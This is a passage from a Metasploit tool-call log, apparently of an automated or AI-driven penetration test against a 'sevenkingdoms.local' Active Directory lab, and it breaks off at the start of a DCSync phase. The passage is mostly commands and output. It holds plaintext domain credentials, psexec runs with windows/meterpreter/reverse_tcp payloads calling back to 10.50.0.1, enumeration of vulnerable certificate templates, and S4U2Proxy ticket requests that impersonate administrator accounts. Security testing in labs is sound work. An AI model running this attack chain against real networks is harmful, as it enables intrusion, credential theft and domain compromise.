### 122. [2025-12-17 12:14:40] `msf_console_execute` ❌

```
[*] 10.50.0.10:445        - 10.50.0.10:445        - Starting SMB login bruteforce
[-] 10.50.0.10:445        - 10.50.0.10:445        - Failed: 'SEVENKINGDOMS\tyron.lannister:powerkingftw135',
[*] 10.50.0.10:445        - Scanned 1 of 1 hosts (100% complete)
[*] 10.50.0.10:445        - Bruteforce completed, 0 credentials were successful.
[*] 10.50.0.10:445        - You can open an SMB session with these credentials and CreateSession set to true
[*] Auxiliary module execution completed
```

### 123. [2025-12-17 12:14:46] `msf_console_execute` ✅

```
SMBUser => tywin.lannister
```

### 124. [2025-12-17 12:14:50] `msf_console_execute` ✅

```
[*] 10.50.0.10:445        - 10.50.0.10:445        - Starting SMB login bruteforce
[+] 10.50.0.10:445        - 10.50.0.10:445        - Success: 'SEVENKINGDOMS\tywin.lannister:powerkingftw135'
[*] 10.50.0.10:445        - Scanned 1 of 1 hosts (100% complete)
[*] 10.50.0.10:445        - Bruteforce completed, 1 credential was successful.
[*] 10.50.0.10:445        - You can open an SMB session with these credentials and CreateSession set to true
[*] Auxiliary module execution completed
```

### 125. [2025-12-17 12:14:59] `msf_console_execute` ✅

```
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
```

### 126. [2025-12-17 12:15:04] `msf_console_execute` ✅

```
RHOSTS => 10.50.0.10
```

### 127. [2025-12-17 12:15:09] `msf_console_execute` ✅

```
SMBUser => tywin.lannister
```

### 128. [2025-12-17 12:15:13] `msf_console_execute` ✅

```
SMBPass => powerkingftw135
```

### 129. [2025-12-17 12:15:17] `msf_console_execute` ✅

```
SMBDomain => SEVENKINGDOMS
```

### 130. [2025-12-17 12:15:21] `msf_console_execute` ✅

```
LHOST => 10.50.0.1
```

### 131. [2025-12-17 12:15:26] `msf_console_execute` ✅

```
LPORT => 4452
```

### 132. [2025-12-17 12:15:30] `msf_console_execute` ❌

```
[*] Started reverse TCP handler on 10.50.0.1:4452 
[*] 10.50.0.10:445 - Connecting to the server...
[*] 10.50.0.10:445 - Authenticating to 10.50.0.10:445|SEVENKINGDOMS as user 'tywin.lannister'...
[-] 10.50.0.10:445 - Exploit failed [no-access]: RubySMB::Error::UnexpectedStatusCode The server responded with an unexpected status code: STATUS_ACCESS_DENIED
[*] Exploit completed, but no session was created.
```

### 133. [2025-12-17 12:15:36] `msf_console_execute` ✅

```
[*] Starting interaction with 3...
```

### 134. [2025-12-17 12:16:12] `msf_console_execute` ✅

```
Process 7800 created.
Channel 4 created.
CN=Lannister,OU=Westerlands,DC=sevenkingdoms,DC=local
```

### 135. [2025-12-17 12:16:48] `msf_console_execute` ✅

```
Process 7456 created.
Channel 5 created.
SEVENKINGDOMS-CA
 - 
kingslanding.sevenkingdoms.local
```

### 136. [2025-12-17 12:17:27] `msf_console_execute` ✅

```
[*] Backgrounding session 3...
```

### 137. [2025-12-17 12:17:31] `msf_module_search` ✅

```
[
  {
    "type": "auxiliary",
    "name": "auxiliary/admin/dcerpc/cve_2022_26923_certifried",
    "rank": "normal"
  },
  {
    "type": "auxiliary",
    "name": "auxiliary/admin/dcerpc/esc_update_ldap_object",
    "rank": "normal"
  },
  {
    "type": "auxiliary",
    "name": "auxiliary/gather/ldap_esc_vulnerable_cert_finder",
    "rank": "normal"
  }
]
```

### 138. [2025-12-17 12:17:42] `msf_module_info` ✅

```
{
  "type": "auxiliary",
  "name": "Misconfigured Certificate Template Finder",
  "fullname": "auxiliary/gather/ldap_esc_vulnerable_cert_finder",
  "rank": "normal",
  "disclosuredate": "2021-06-17",
  "description": "This module allows users to query a LDAP server for vulnerable certificate templates and will print these certificates out in a table along with which attack they are vulnerable to and the SIDs that can be used to enroll in that certificate template. Additionally the module will also print out a list of known certificate servers along with info about which vulnerable certificate templates the certificate server allows enrollment in and which SIDs are authorized to use that certificate server to perform this enrollment operation. Currently the module is capable of checking for certificates that are vulnerable to ESC1, ESC2, ESC3, ESC4, ESC13, and ESC15. The module is limited to checking for these techniques due to them being identifiable remotely from a normal user account by analyzing the objects in LDAP. The module can also check for ESC9, ESC10 and ESC16 but this requires an Administrative WinRM session to be established to definitively check for these techniques.",
  "license": "Metasploit Framework License (BSD)",
  "filepath": "/opt/metasploit-framework/embedded/framework/modules/auxiliary/gather/ldap_esc_vulnerable_cert_finder.rb",
  "arch": [],
  "platform": [],
  "authors": [
    "Grant Willcox",
    "Spencer McIntyre",
    "jheysel-r7"
  ],
  "privileged": false,
  "check": false,
  "default_options": {
    "SSL": false
  },
  "references": [
    [
      "URL",
      "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
    ],
    [
      "URL",
      "https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7"
    ],
    [
      "URL",
      "https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53"
    ],
    [
      "URL",
      "https://trustedsec.com/blog
... [truncated]
```

### 139. [2025-12-17 12:17:47] `msf_console_execute` ✅

```
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
```

### 140. [2025-12-17 12:17:52] `msf_console_execute` ✅

```
RHOSTS => 10.50.0.10
```

### 141. [2025-12-17 12:17:56] `msf_console_execute` ✅

```
LDAPUsername => tywin.lannister
```

### 142. [2025-12-17 12:18:01] `msf_console_execute` ✅

```
LDAPPassword => powerkingftw135
```

### 143. [2025-12-17 12:18:05] `msf_console_execute` ✅

```
LDAPDomain => sevenkingdoms.local
```

### 144. [2025-12-17 12:18:09] `msf_console_execute` ❌

```
[*] Running module against 10.50.0.10
[*] Discovering base DN automatically
[*] user: tywin.lannister, domain: sevenkingdoms.local
[!] Unable to determine the version of Window so these all might be false postives! WinRM authorization error: WinRM::WinRMAuthorizationError
[!] No IP addresses were found for kingslanding.sevenkingdoms.local via DNS.
[!] Couldn't find any vulnerable ESC13 templates!
[+] Template: Administrator
[*]   Distinguished Name: CN=Administrator,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=sevenkingdoms,DC=local
[*]   Manager Approval: Disabled
[*]   Required Signatures: 0
[+]   Vulnerable to: ESC3_TEMPLATE_2
[!]   Potentially vulnerable to: ESC16_2 (the template is in a vulnerable configuration but in order to exploit registry key StrongCertificateBindingEnforcement must be set to 2 and the CA must have the SID security extention OID: 1.3.6.1.4.1.311.25.2 listed under the DisbaledExtensionlist registry key and EDITF_ATTRIBUTESUBJECTALTNAME2 enabled in the EditFlags policy).
[*]   Permissions: READ
[*]   Notes: ESC16_2: Template appears to be vulnerable (most templates do)
[*]   Certificate Template Write-Enabled SIDs:
[*]   Certificate Template Enrollment SIDs:
[*]     * S-1-5-21-320294251-1534116053-1819042690-512 (Domain Admins)
[*]     * S-1-5-21-320294251-1534116053-1819042690-519 (Enterprise Admins)
[+]   Issuing CA: SEVENKINGDOMS-CA (kingslanding.sevenkingdoms.local)
[*]     Enrollment SIDs:
[*]       * S-1-5-11 (Authenticated Users)
[*]       * S-1-5-21-320294251-1534116053-1819042690-519 (Enterprise Admins)
[+] Template: EFS
[*]   Distinguished Name: CN=EFS,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=sevenkingdoms,DC=local
[*]   Manager Approval: Disabled
[*]   Required Signatures: 0
[*]   Vulnerable to: (none)
[!]   Potentially vulnerable to: ESC16_2 (the template is in a vulnerable configuration but in order to exploit registry key StrongCertificateBindingEnforceme
... [truncated]
```

### 145. [2025-12-17 12:18:54] `msf_console_execute` ✅

```
REPORT => all
```

### 146. [2025-12-17 12:18:58] `msf_console_execute` ❌

```
[*] Running module against 10.50.0.10
[*] Discovering base DN automatically
[*] user: tywin.lannister, domain: sevenkingdoms.local
[!] Unable to determine the version of Window so these all might be false postives! WinRM authorization error: WinRM::WinRMAuthorizationError
[!] No IP addresses were found for kingslanding.sevenkingdoms.local via DNS.
[!] Couldn't find any vulnerable ESC13 templates!
[+] Template: Administrator
[*]   Distinguished Name: CN=Administrator,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=sevenkingdoms,DC=local
[*]   Manager Approval: Disabled
[*]   Required Signatures: 0
[+]   Vulnerable to: ESC3_TEMPLATE_2
[!]   Potentially vulnerable to: ESC16_2 (the template is in a vulnerable configuration but in order to exploit registry key StrongCertificateBindingEnforcement must be set to 2 and the CA must have the SID security extention OID: 1.3.6.1.4.1.311.25.2 listed under the DisbaledExtensionlist registry key and EDITF_ATTRIBUTESUBJECTALTNAME2 enabled in the EditFlags policy).
[*]   Permissions: READ
[*]   Notes: ESC16_2: Template appears to be vulnerable (most templates do)
[*]   Certificate Template Write-Enabled SIDs:
[*]   Certificate Template Enrollment SIDs:
[*]     * S-1-5-21-320294251-1534116053-1819042690-512 (Domain Admins)
[*]     * S-1-5-21-320294251-1534116053-1819042690-519 (Enterprise Admins)
[+]   Issuing CA: SEVENKINGDOMS-CA (kingslanding.sevenkingdoms.local)
[*]     Enrollment SIDs:
[*]       * S-1-5-11 (Authenticated Users)
[*]       * S-1-5-21-320294251-1534116053-1819042690-519 (Enterprise Admins)
[+] Template: CA
[*]   Distinguished Name: CN=CA,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=sevenkingdoms,DC=local
[*]   Manager Approval: Disabled
[*]   Required Signatures: 0
[+]   Vulnerable to: ESC1, ESC2, ESC3_TEMPLATE_2
[*]   Permissions: READ
[*]   Notes:
[*]     * ESC1: Request can specify a subjectAltName (msPKI-Certificate-Name-Flag) and EKUs permit aut
... [truncated]
```

### 147. [2025-12-17 12:19:41] `msf_console_execute` ✅

```
[*] Starting interaction with 3...
```

### 148. [2025-12-17 12:20:18] `msf_console_execute` ✅

```
Process 6860 created.
Channel 6 created.
WINTERFELL$
 - 
CN=WINTERFELL,OU=Domain Controllers,DC=north,DC=sevenkingdoms,DC=local
```

### 149. [2025-12-17 12:21:04] `msf_db_status` ✅

```
{
  "driver": "postgresql",
  "db": "msf"
}
```


## Phase 6: S4U2Proxy Attack

### 150. [2025-12-17 12:22:21] `msf_console_execute` ✅

```
[*] Backgrounding session 3...
```

### 151. [2025-12-17 12:22:29] `msf_console_execute` ✅

```
[*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session
```

### 152. [2025-12-17 12:22:37] `msf_console_execute` ✅

```
RHOSTS => 10.50.0.11
```

### 153. [2025-12-17 12:22:41] `msf_console_execute` ✅

```
SMBUser => jon.snow
```

### 154. [2025-12-17 12:22:46] `msf_console_execute` ✅

```
SMBPass => iknownothing
```

### 155. [2025-12-17 12:22:53] `msf_console_execute` ✅

```
SMBDomain => NORTH
```

### 156. [2025-12-17 12:22:57] `msf_console_execute` ✅

```
[*] 10.50.0.11:445        - 10.50.0.11:445        - Starting SMB login bruteforce
[+] 10.50.0.11:445        - 10.50.0.11:445        - Success: 'NORTH\jon.snow:iknownothing'
[*] 10.50.0.11:445        - Scanned 1 of 1 hosts (100% complete)
[*] 10.50.0.11:445        - Bruteforce completed, 1 credential was successful.
[*] 10.50.0.11:445        - You can open an SMB session with these credentials and CreateSession set to true
[*] Auxiliary module execution completed
```

### 157. [2025-12-17 12:23:04] `msf_console_execute` ✅

```
[*] Starting interaction with 3...
```

### 158. [2025-12-17 12:23:51] `msf_console_execute` ✅

```
Process 5496 created.
Channel 7 created.
jon.snow: CIFS/winterfell, CIFS/winterfell.north.sevenkingdoms.local
CASTELBLACK$: HTTP/winterfell, HTTP/winterfell.north.sevenkingdoms.local
```

### 159. [2025-12-17 12:24:50] `msf_module_search` ✅

```
[
  {
    "type": "auxiliary",
    "name": "auxiliary/admin/kerberos/forge_ticket",
    "rank": "normal"
  }
]
```

### 160. [2025-12-17 12:24:54] `msf_module_search` ✅

```
[
  {
    "type": "auxiliary",
    "name": "auxiliary/admin/ldap/rbcd",
    "rank": "normal"
  },
  {
    "type": "auxiliary",
    "name": "auxiliary/gather/ldap_query",
    "rank": "normal"
  }
]
```

### 161. [2025-12-17 12:25:01] `msf_module_search` ✅

```
[
  {
    "type": "auxiliary",
    "name": "auxiliary/admin/dcerpc/esc_update_ldap_object",
    "rank": "normal"
  },
  {
    "type": "auxiliary",
    "name": "auxiliary/admin/kerberos/forge_ticket",
    "rank": "normal"
  },
  {
    "type": "auxiliary",
    "name": "auxiliary/admin/kerberos/get_ticket",
    "rank": "normal"
  },
  {
    "type": "auxiliary",
    "name": "auxiliary/admin/kerberos/inspect_ticket",
    "rank": "normal"
  },
  {
    "type": "auxiliary",
    "name": "auxiliary/admin/kerberos/keytab",
    "rank": "normal"
  },
  {
    "type": "auxiliary",
    "name": "auxiliary/admin/kerberos/ms14_068_kerberos_checksum",
    "rank": "normal"
  },
  {
    "type": "auxiliary",
    "name": "auxiliary/admin/kerberos/ticket_converter",
    "rank": "normal"
  },
  {
    "type": "post",
    "name": "post/multi/gather/unix_kerberos_tickets",
    "rank": "normal"
  },
  {
    "type": "post",
    "name": "post/windows/escalate/golden_ticket",
    "rank": "normal"
  },
  {
    "type": "post",
    "name": "post/windows/manage/kerberos_tickets",
    "rank": "normal"
  }
]
```

### 162. [2025-12-17 12:25:08] `msf_module_info` ✅

```
{
  "type": "auxiliary",
  "name": "Kerberos TGT/TGS Ticket Requester",
  "fullname": "auxiliary/admin/kerberos/get_ticket",
  "rank": "normal",
  "disclosuredate": "",
  "description": "This module requests TGT/TGS Kerberos tickets from the KDC",
  "license": "Metasploit Framework License (BSD)",
  "filepath": "/opt/metasploit-framework/embedded/framework/modules/auxiliary/admin/kerberos/get_ticket.rb",
  "arch": [],
  "platform": [],
  "authors": [
    "Christophe De La Fuente",
    "Spencer McIntyre",
    "Will Schroeder",
    "Lee Christensen",
    "Oliver Lyak",
    "smashery"
  ],
  "privileged": false,
  "check": false,
  "default_options": null,
  "references": [],
  "actions": {
    "0": "GET_TGT",
    "1": "GET_TGS",
    "2": "GET_HASH"
  },
  "default_action": "GET_TGT",
  "stance": "aggressive",
  "options": {
    "WORKSPACE": {
      "type": "string",
      "required": false,
      "advanced": true,
      "desc": "Specify the workspace for this module"
    },
    "VERBOSE": {
      "type": "bool",
      "required": false,
      "advanced": true,
      "desc": "Enable detailed status messages",
      "default": false
    },
    "RHOSTS": {
      "type": "rhosts",
      "required": true,
      "advanced": false,
      "desc": "The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html"
    },
    "RPORT": {
      "type": "port",
      "required": true,
      "advanced": false,
      "desc": "The target port",
      "default": 88
    },
    "Timeout": {
      "type": "integer",
      "required": true,
      "advanced": false,
      "desc": "The TCP timeout to establish Kerberos connection and read data",
      "default": 10
    },
    "DOMAIN": {
      "type": "string",
      "required": false,
      "advanced": false,
      "desc": "The Fully Qualified Domain Name (FQDN). Ex: mydomain.local"
    },
    "USERNAME": {
      "type": "string",
      "required": false,
      "advanced": false,
      "desc": "The doma
... [truncated]
```

### 163. [2025-12-17 12:25:14] `msf_console_execute` ✅

```
[*] Backgrounding session 3...
```

### 164. [2025-12-17 12:25:22] `msf_console_execute` ✅

```
[*] Setting default action GET_TGT - view all 3 actions with the show actions command
```

### 165. [2025-12-17 12:25:29] `msf_console_execute` ✅

```
ACTION => GET_TGS
```

### 166. [2025-12-17 12:25:34] `msf_console_execute` ✅

```
RHOSTS => 10.50.0.11
```

### 167. [2025-12-17 12:25:40] `msf_console_execute` ✅

```
DOMAIN => north.sevenkingdoms.local
```

### 168. [2025-12-17 12:25:44] `msf_console_execute` ✅

```
USERNAME => jon.snow
```

### 169. [2025-12-17 12:25:48] `msf_console_execute` ✅

```
PASSWORD => iknownothing
```

### 170. [2025-12-17 12:25:53] `msf_console_execute` ✅

```
SPN => CIFS/winterfell.north.sevenkingdoms.local
```

### 171. [2025-12-17 12:25:57] `msf_console_execute` ✅

```
IMPERSONATE => administrator
```

### 172. [2025-12-17 12:26:02] `msf_console_execute` ✅

```
[*] Running module against 10.50.0.11
[+] 10.50.0.11:88 - Received a valid TGT-Response
[*] 10.50.0.11:88 - TGT MIT Credential Cache ticket saved to /home/tuomo/.msf4/loot/20251217122603_default_10.50.0.11_mit.kerberos.cca_573011.bin
[*] 10.50.0.11:88 - Getting TGS impersonating administrator@north.sevenkingdoms.local (SPN: CIFS/winterfell.north.sevenkingdoms.local)
[+] 10.50.0.11:88 - Received a valid TGS-Response
[*] 10.50.0.11:88 - TGS MIT Credential Cache ticket saved to /home/tuomo/.msf4/loot/20251217122603_default_10.50.0.11_mit.kerberos.cca_987641.bin
[+] 10.50.0.11:88 - Received a valid TGS-Response
[*] 10.50.0.11:88 - TGS MIT Credential Cache ticket saved to /home/tuomo/.msf4/loot/20251217122603_default_10.50.0.11_mit.kerberos.cca_500674.bin
[*] Auxiliary module execution completed
```

### 173. [2025-12-17 12:26:11] `msf_console_execute` ✅

```
[*] Using configured payload windows/meterpreter/reverse_tcp
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
```

### 174. [2025-12-17 12:26:16] `msf_console_execute` ✅

```
RHOSTS => winterfell.north.sevenkingdoms.local
```

### 175. [2025-12-17 12:26:20] `msf_console_execute` ✅

```
SMB::Auth => kerberos
```

### 176. [2025-12-17 12:26:26] `msf_console_execute` ✅

```
SMB::Krb5Ccname => /home/tuomo/.msf4/loot/20251217122603_default_10.50.0.11_mit.kerberos.cca_500674.bin
```

### 177. [2025-12-17 12:26:30] `msf_console_execute` ✅

```
SMBDomain => NORTH
```

### 178. [2025-12-17 12:26:35] `msf_console_execute` ✅

```
SMB::Rhostname => winterfell.north.sevenkingdoms.local
```

### 179. [2025-12-17 12:26:40] `msf_console_execute` ✅

```
LHOST => 10.50.0.1
```

### 180. [2025-12-17 12:26:44] `msf_console_execute` ✅

```
LPORT => 4453
```

### 181. [2025-12-17 12:26:50] `msf_console_execute` ❌

```
[-] Msf::OptionValidateError The following options failed to validate:
[-] Invalid option RHOSTS: Host resolution failed: winterfell.north.sevenkingdoms.local
```

### 182. [2025-12-17 12:26:55] `msf_console_execute` ✅

```
RHOSTS => 10.50.0.11
```

### 183. [2025-12-17 12:27:00] `msf_console_execute` ❌

```
[*] Started reverse TCP handler on 10.50.0.1:4453 
[*] 10.50.0.11:445 - Connecting to the server...
[*] 10.50.0.11:445 - Authenticating to 10.50.0.11:445|NORTH as user 'tywin.lannister'...
[-] 10.50.0.11:445 - Failed to load a usable credential from ticket file: /home/tuomo/.msf4/loot/20251217122603_default_10.50.0.11_mit.kerberos.cca_500674.bin
[-] 10.50.0.11:445 - Attempt failed to find a valid credential in /home/tuomo/.msf4/loot/20251217122603_default_10.50.0.11_mit.kerberos.cca_500674.bin for realm="NORTH", sname=nil, sname_hostname="winterfell.north.sevenkingdoms.local":
[-] 10.50.0.11:445 -   Filtered credential /home/tuomo/.msf4/loot/20251217122603_default_10.50.0.11_mit.kerberos.cca_500674.bin #1 reason:  Realm (NORTH) does not match (realm: NORTH.SEVENKINGDOMS.LOCAL)
[-] 10.50.0.11:445 - Attempt failed to find a valid credential in /home/tuomo/.msf4/loot/20251217122603_default_10.50.0.11_mit.kerberos.cca_500674.bin for realm="NORTH", sname="krbtgt/north.sevenkingdoms.local", sname_hostname=nil
[-] 10.50.0.11:445 -   Filtered credential /home/tuomo/.msf4/loot/20251217122603_default_10.50.0.11_mit.kerberos.cca_500674.bin #1 reason:  Realm (NORTH) does not match (realm: NORTH.SEVENKINGDOMS.LOCAL)
[-] 10.50.0.11:445 - Exploit failed: Rex::Proto::Kerberos::Model::Error::KerberosError Failed to load a usable credential from ticket file: /home/tuomo/.msf4/loot/20251217122603_default_10.50.0.11_mit.kerberos.cca_500674.bin
[*] Exploit completed, but no session was created.
```

### 184. [2025-12-17 12:27:07] `msf_console_execute` ✅

```
SMBDomain => NORTH.SEVENKINGDOMS.LOCAL
```

### 185. [2025-12-17 12:27:11] `msf_console_execute` ❌

```
[*] Started reverse TCP handler on 10.50.0.1:4453 
[*] 10.50.0.11:445 - Connecting to the server...
[*] 10.50.0.11:445 - Authenticating to 10.50.0.11:445|NORTH.SEVENKINGDOMS.LOCAL as user 'tywin.lannister'...
[-] 10.50.0.11:445 - Failed to load a usable credential from ticket file: /home/tuomo/.msf4/loot/20251217122603_default_10.50.0.11_mit.kerberos.cca_500674.bin
[-] 10.50.0.11:445 - Attempt failed to find a valid credential in /home/tuomo/.msf4/loot/20251217122603_default_10.50.0.11_mit.kerberos.cca_500674.bin for realm="NORTH.SEVENKINGDOMS.LOCAL", sname=nil, sname_hostname="winterfell.north.sevenkingdoms.local":
[-] 10.50.0.11:445 -   Filtered credential /home/tuomo/.msf4/loot/20251217122603_default_10.50.0.11_mit.kerberos.cca_500674.bin #1 reason: Username (tywin.lannister) does not match (username: administrator)
[-] 10.50.0.11:445 - Attempt failed to find a valid credential in /home/tuomo/.msf4/loot/20251217122603_default_10.50.0.11_mit.kerberos.cca_500674.bin for realm="NORTH.SEVENKINGDOMS.LOCAL", sname="krbtgt/north.sevenkingdoms.local", sname_hostname=nil
[-] 10.50.0.11:445 -   Filtered credential /home/tuomo/.msf4/loot/20251217122603_default_10.50.0.11_mit.kerberos.cca_500674.bin #1 reason: SPN (krbtgt/north.sevenkingdoms.local) does not match (spn: CIFS/winterfell.north.sevenkingdoms.local)
[-] 10.50.0.11:445 - Exploit failed: Rex::Proto::Kerberos::Model::Error::KerberosError Failed to load a usable credential from ticket file: /home/tuomo/.msf4/loot/20251217122603_default_10.50.0.11_mit.kerberos.cca_500674.bin
[*] Exploit completed, but no session was created.
```

### 186. [2025-12-17 12:27:18] `msf_console_execute` ✅

```
SMBUser => administrator
```

### 187. [2025-12-17 12:27:22] `msf_console_execute` ❌

```
[*] Started reverse TCP handler on 10.50.0.1:4453 
[*] 10.50.0.11:445 - Connecting to the server...
[*] 10.50.0.11:445 - Authenticating to 10.50.0.11:445|NORTH.SEVENKINGDOMS.LOCAL as user 'administrator'...
[*] 10.50.0.11:445 - Patching sname from CIFS/winterfell.north.sevenkingdoms.local to cifs/winterfell.north.sevenkingdoms.local
[*] 10.50.0.11:445 - Loaded a credential from ticket file: /home/tuomo/.msf4/loot/20251217122603_default_10.50.0.11_mit.kerberos.cca_500674.bin
[*] 10.50.0.11:445 - Selecting PowerShell target
[*] 10.50.0.11:445 - Executing the payload...
[-] 10.50.0.11:445 - Service failed to start - ACCESS_DENIED
[*] Exploit completed, but no session was created.
```

### 188. [2025-12-17 12:27:48] `msf_module_search` ✅

```
No modules found matching query.
```

### 189. [2025-12-17 12:27:55] `msf_module_search` ✅

```
[
  {
    "type": "auxiliary",
    "name": "auxiliary/scanner/smb/impacket/wmiexec",
    "rank": "normal"
  },
  {
    "type": "exploit",
    "name": "exploit/linux/http/nagios_xi_configwizards_authenticated_rce",
    "rank": "excellent"
  },
  {
    "type": "exploit",
    "name": "exploit/windows/browser/ie_createobject",
    "rank": "excellent"
  },
  {
    "type": "exploit",
    "name": "exploit/windows/browser/wmi_admintools",
    "rank": "great"
  },
  {
    "type": "exploit",
    "name": "exploit/windows/ftp/freefloatftp_wbem",
    "rank": "excellent"
  },
  {
    "type": "exploit",
    "name": "exploit/windows/ftp/open_ftpd_wbem",
    "rank": "excellent"
  },
  {
    "type": "exploit",
    "name": "exploit/windows/http/miniweb_upload_wbem",
    "rank": "excellent"
  },
  {
    "type": "exploit",
    "name": "exploit/windows/http/oracle_btm_writetofile",
    "rank": "excellent"
  },
  {
    "type": "exploit",
    "name": "exploit/windows/http/oracle_event_processing_upload",
    "rank": "excellent"
  },
  {
    "type": "exploit",
    "name": "exploit/windows/local/ps_wmi_exec",
    "rank": "excellent"
  },
  {
    "type": "exploit",
    "name": "exploit/windows/local/wmi",
    "rank": "excellent"
  },
  {
    "type": "exploit",
    "name": "exploit/windows/local/wmi_persistence",
    "rank": "normal"
  },
  {
    "type": "exploit",
    "name": "exploit/windows/misc/ibm_director_cim_dllinject",
    "rank": "excellent"
  },
  {
    "type": "exploit",
    "name": "exploit/windows/misc/solidworks_workgroup_pdmwservice_file_write",
    "rank": "good"
  },
  {
    "type": "exploit",
    "name": "exploit/windows/smb/ms10_061_spoolss",
    "rank": "excellent"
  },
  {
    "type": "post",
    "name": "post/windows/gather/wmic_command",
    "rank": "normal"
  }
]
```

### 190. [2025-12-17 12:28:00] `msf_console_execute` ✅

```
[*] Setting default action GET_TGS - view all 3 actions with the show actions command
```

### 191. [2025-12-17 12:28:05] `msf_console_execute` ✅

```
RHOSTS => 10.50.0.11
```

### 192. [2025-12-17 12:28:09] `msf_console_execute` ✅

```
DOMAIN => north.sevenkingdoms.local
```

### 193. [2025-12-17 12:28:14] `msf_console_execute` ✅

```
USERNAME => jon.snow
```

### 194. [2025-12-17 12:28:21] `msf_console_execute` ✅

```
PASSWORD => iknownothing
```

### 195. [2025-12-17 12:28:26] `msf_console_execute` ✅

```
SPN => CIFS/winterfell.north.sevenkingdoms.local
```

### 196. [2025-12-17 12:28:30] `msf_console_execute` ✅

```
IMPERSONATE => eddard.stark
```

### 197. [2025-12-17 12:28:36] `msf_console_execute` ✅

```
[*] Running module against 10.50.0.11
[*] Using cached credential for krbtgt/NORTH.SEVENKINGDOMS.LOCAL@NORTH.SEVENKINGDOMS.LOCAL jon.snow@NORTH.SEVENKINGDOMS.LOCAL
[*] 10.50.0.11:88 - Getting TGS impersonating eddard.stark@north.sevenkingdoms.local (SPN: CIFS/winterfell.north.sevenkingdoms.local)
[+] 10.50.0.11:88 - Received a valid TGS-Response
[*] 10.50.0.11:88 - TGS MIT Credential Cache ticket saved to /home/tuomo/.msf4/loot/20251217122836_default_10.50.0.11_mit.kerberos.cca_306168.bin
[+] 10.50.0.11:88 - Received a valid TGS-Response
[*] 10.50.0.11:88 - TGS MIT Credential Cache ticket saved to /home/tuomo/.msf4/loot/20251217122836_default_10.50.0.11_mit.kerberos.cca_280012.bin
[*] Auxiliary module execution completed
```

### 198. [2025-12-17 12:28:42] `msf_console_execute` ✅

```
[*] Using configured payload windows/meterpreter/reverse_tcp
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
```

### 199. [2025-12-17 12:28:47] `msf_console_execute` ✅

```
RHOSTS => 10.50.0.11
```

### 200. [2025-12-17 12:28:52] `msf_console_execute` ✅

```
SMB::Auth => kerberos
```

### 201. [2025-12-17 12:28:59] `msf_console_execute` ✅

```
SMB::Krb5Ccname => /home/tuomo/.msf4/loot/20251217122836_default_10.50.0.11_mit.kerberos.cca_280012.bin
```

### 202. [2025-12-17 12:29:03] `msf_console_execute` ✅

```
SMBDomain => NORTH.SEVENKINGDOMS.LOCAL
```

### 203. [2025-12-17 12:29:09] `msf_console_execute` ✅

```
SMBUser => eddard.stark
```

### 204. [2025-12-17 12:29:13] `msf_console_execute` ✅

```
SMB::Rhostname => winterfell.north.sevenkingdoms.local
```

### 205. [2025-12-17 12:29:18] `msf_console_execute` ✅

```
LHOST => 10.50.0.1
```

### 206. [2025-12-17 12:29:23] `msf_console_execute` ✅

```
LPORT => 4454
```

### 207. [2025-12-17 12:29:29] `msf_console_execute` ❌

```
[*] Started reverse TCP handler on 10.50.0.1:4454 
[*] 10.50.0.11:445 - Connecting to the server...
[*] 10.50.0.11:445 - Authenticating to 10.50.0.11:445|NORTH.SEVENKINGDOMS.LOCAL as user 'eddard.stark'...
[*] 10.50.0.11:445 - Patching sname from CIFS/winterfell.north.sevenkingdoms.local to cifs/winterfell.north.sevenkingdoms.local
[*] 10.50.0.11:445 - Loaded a credential from ticket file: /home/tuomo/.msf4/loot/20251217122836_default_10.50.0.11_mit.kerberos.cca_280012.bin
[*] 10.50.0.11:445 - Selecting PowerShell target
[*] 10.50.0.11:445 - Executing the payload...
[-] 10.50.0.11:445 - Service failed to start - ACCESS_DENIED
[*] Exploit completed, but no session was created.
```

### 208. [2025-12-17 12:29:56] `msf_console_execute` ✅

```
(no output)
```


## Phase 7: DCSync - Domain Admin

### 209. [2025-12-17 12:30:09] `msf_console_execute` ✅

```
[*] Using configured payload windows/meterpreter/reverse_tcp
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
```

### 210. [2025-12-17 12:30:13] `msf_console_execute` ✅

```
Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   SERVICE_DESCRIPTION                    no        Service description to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal rea
                                                    d/write folder share


   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


   Used when making a new connection via RHOSTS:

   Name       Current Setting            Required  Description
   ----       ---------------            --------  -----------
   RHOSTS     10.50.0.11                 no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basic
                                                   s/using-metasploit.html
   RPORT      445                        no        The target port (TCP)
   SMBDomain  NORTH.SEVENKINGDOMS.LOCAL  no        The Windows domain to use for authentication
   SMBPass    powerkingftw135            no        The password for the specified username
   SMBUser    eddard.stark               no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.50.0.1        yes       The listen address (an interface may be specified)
   LPORT     4454             yes       The listen port


Expl
... [truncated]
```

### 211. [2025-12-17 12:30:19] `msf_module_search` ✅

```
No modules found matching query.
```

### 212. [2025-12-17 12:30:27] `msf_module_search` ✅

```
No modules found matching query.
```

### 213. [2025-12-17 12:30:32] `msf_module_search` ✅

```
[
  {
    "type": "auxiliary",
    "name": "auxiliary/gather/windows_secrets_dump",
    "rank": "normal"
  },
  {
